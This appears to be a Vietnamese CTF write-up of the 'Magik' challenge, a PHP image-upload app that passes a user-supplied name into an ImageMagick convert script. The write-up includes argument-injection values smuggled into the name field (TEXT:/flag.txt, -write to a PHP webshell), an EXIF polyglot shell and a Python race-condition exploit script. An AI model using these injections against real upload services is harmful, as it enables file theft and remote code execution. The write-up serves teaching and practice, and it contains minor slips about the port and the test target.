---
title: Magik

---

# Magik
- Author : Tiwza
## Overview
![{BBFD61B4-A254-4DB8-9F65-A1E5CC5EEB72}](https://hackmd.io/_uploads/H1KCSzoRxg.png)
### Cầu trúc của bài này 
```code=
magik/
└── app/
        ├── index.php
   ├── convert.sh
   ├── docker-compose.yml
   ├── Dockerfile
   ├── flags.txt
   └── readflag.c
```
### Lần lượt đọc từng file 
1. `Dockerfile`
```
- Đọc `Dockerfile` để hiểu rõ hơn
```code=
COPY readflag.c /readflag.c
RUN gcc /readflag.c -o /readflag
RUN chmod u+s /readflag
RUN rm -f /readflag.c
```
=> Đặt `SUID` lên `/readflag` nên user ở ` www-data` không thể đọc 
```code
COPY /flags.txt /flag.txt
RUN chmod 400 /flag.txt
```
=> Chỉ root mới đọc được flag 
```code
# CHALLENGE
WORKDIR /app
COPY app/ /app

COPY convert.sh /opt/convert.sh
RUN chmod +x /opt/convert.sh

RUN chown -R www-data:www-data /app
```
=> Đặt workdir ở `/app`
=> Cấp quyền thực thi cho `convert.sh`
=> Web server chỉ có quyền đọc và ghi theo owner 
```code
USER www-data
CMD ["php", "-S", "0.0.0.0:8000", "-t", "/app"]
```
=> user không có quyền root => đồng nghĩa với việc không đọc được flag 
2. `convert.sh`
```code
convert $1 -resize 64x64 -background none -gravity center -extent 64x64 $2
```
=> như ta thấy `$1` không nằm trong single quotation từ đó dẫn đến shell argument injection 
=> Khi đó ta có thể thêm vào nhiều input thay vì 1 ví dụ `convert arg1 arg2 -resize …`
```code
find . -type f -exec exiftool -overwrite_original -all= {} + >/dev/null 2>&1 || true
```
=> xóa hết các file có chứa `metadata/exif`
3. `readflag.c`
```code=
// set uid 0 and print flag.txt

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("cat /flag.txt");
    return 0;
}
```
=> Đọc được file flag 
=> như vậy từ `Dockerfile` ta có thể thấy không thể đọc flag với quyền `user` tuy nhiên ở file này `flag.c` lại có thể đọc được flag => Làm cách nào đó để trigger được file này thì sẽ in được ra flag 
4. `app/index.php`
```code
<?php


if(isset($_FILES['img']) && isset($_POST['name'])) {
    $proc = proc_open(
        $cmd = [
            '/opt/convert.sh',
            $_FILES['img']['tmp_name'],
            $outputName = 'static/'.$_POST['name'].'.png'
        ],
        [],
        $pipes
    );
    proc_close($proc);

} else {
    highlight_file(__FILE__);
}

```
=> hai tham số  `$_FILES['img']['tmp_name']` và `static/'.$_POST['name'].'.png` được lấy ra và đưa vào command trong file `convert.sh`

5. `docker-compose.yml`
```code
services:
  frontend:
    build: .
    ports:
      - "8000:8000"
```
=> service mở dịch vụ ở port `8080`
## Solve 
![{9381F73E-CA46-497D-8A3E-8BB7C2D445C8}](https://hackmd.io/_uploads/HynO-4jCxx.png)

- Ta có thể thấy ở trên `untrusted data` đó là `$_POST['name']`
- Tuy nhiên sẽ không CMDi được ở đây bởi câu lệnh đã được chuyển thành mảng và mảng thì đối với php thì :
    -  ![{E4561D11-AD1C-4583-AEC2-60EFCBDD48BB}](https://hackmd.io/_uploads/H1TPGPoCgx.png)
- Một vài research dựa vào tên chall 
    - ![{3F0A29D5-F274-4654-80E0-747BAB0AE0B2}](https://hackmd.io/_uploads/BJ8TZ4jClg.png)
- [Theo bài viết thì nếu `Argument Injection` được thì có thể đọc file bất kì nhờ vào việc chèn `TEXT:file` và kết quả sẽ trả về ở nội dung trong file](https://book.jorianwoltjer.com/web/server-side/imagemagick#argument-injection)
- Auke giờ hãy test thử đọc `etc/passwd`
```code
PS C:\Users\ADMIN\Desktop\Kep-moving\My_World\CTF\2025\MelC0n\magik> curl.exe -X POST "http://127.0.0.1:8000/" `
>>   -F "name=xyz TEXT:/flag.txt" `
>>   -F "img=@payload.png"
```
- Kết quả nhận được 
    - ![{B690AF6A-71CE-4901-9497-D60095FB1BB5}](https://hackmd.io/_uploads/H1zonDsCel.png)
    - ![{3DB0A113-2C6B-4E6A-823B-055881C108CF}](https://hackmd.io/_uploads/HygR2Ps0xe.png)
    - ![{8566EBCC-D1D0-44A3-B9FC-ECCE58C548D9}](https://hackmd.io/_uploads/By7nnwiCxl.png)
=> [Và đó là Local File Inclusion](https://www.invicti.com/learn/local-file-inclusion-lfi/)
- Thử với flag 
    - ![image](https://hackmd.io/_uploads/S1PbaPiClx.png) 
=> Không có Permission 

- Như ở trên đã trình bày chỉ có thể trigger `/readflag` mới lấy được flag => đồng nghĩa với việc phải RCE
- Upload ảnh mà để RCE thì chỉ có thể [POLYGLOT](https://d47sec.wordpress.com/2021/09/02/tim-hieu-ve-polyglot-file/)
- Dùng `exiftool ` để gen ra ảnh nào 
    - ![{32D90D13-E70B-4995-A630-C3CC747245A2}](https://hackmd.io/_uploads/rkeYl_iRel.png)
    - ![{8D03CC8E-162C-472B-B0DC-BA8F14E3B030}](https://hackmd.io/_uploads/B1K_9OiRgl.png)
=> Như vậy payload đã bị xóa hết các file có chứa exif (Phần EXIF này có thể bị lợi dụng để giấu mã độc hoặc payload (ví dụ: PHP code) mà trình xem ảnh bình thường không hiển thị, nhưng server có thể đọc được)
- Vậy làm thế nào để không bị xóa exif
=> RACE CONDITIONNN
- Trình tự sẽ như sau 
    - Upload ảnh chứa webshell như đã trình bày ở trên 
    - Request đến và thực thi payload trước khi nó bị xóa bởi `convert.sh`
```code
import requests
import threading
import sys

URL = ""
CMD = ""

def request_to_upload_file():
	files = {
		'img' : open('a.jpeg', 'rb')
	}
	data = {
		'name' : 'haha -write /app/shell_magic.php a'
	}
	requests.post(URL, data=data, files=files)

def request_to_access_file():
	res = requests.get(f"{URL}/shell_magic.php?cmd={CMD}")

	if res.ok:
		print(res.text)
	else:
		print(f"Failed: {res.status_code}")

def main():
	global URL
	global CMD

	if len(sys.argv) != 3:
		print("Usage: python script.py <URL> <CMD>")
		return

	URL = sys.argv[1]
	CMD = sys.argv[2]

	threading.Thread(target=request_to_upload_file).start()
	threading.Thread(target=request_to_access_file).start()
	pass


if __name__ == "__main__":
	main()
```
![{4B973A42-E82D-41B2-88AC-CE20E33DA1F1}](https://hackmd.io/_uploads/SJYn3ui0lx.png)

 


## Conclusion 

- Shell argument injection -> đọc được passwd và chỉ có quyền user 
- POLYGLOT -> trigger `/readflag` nhưng bị `convert.sh` xóa mất payload nằm trong exif
- POLYGLOT + Race Condition để đọc trigger ``/readflag` trước khi payload bị `convert.sh` xóa 

